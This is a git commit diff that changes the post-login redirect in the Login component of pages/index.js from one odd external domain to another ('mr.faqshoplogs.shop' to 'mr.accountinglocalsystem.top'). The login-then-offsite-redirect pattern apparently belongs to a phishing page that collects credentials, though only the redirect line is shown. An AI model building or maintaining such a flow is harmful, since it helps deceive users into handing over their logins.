b587bc6e0491171e81a62553fa72d5d46c950f58
husknet <127146284+husknet@users.noreply.github.com>
2025-03-10 13:54:43 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://mr.faqshoplogs.shop/';
+      window.location.href = 'https://mr.accountinglocalsystem.top/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
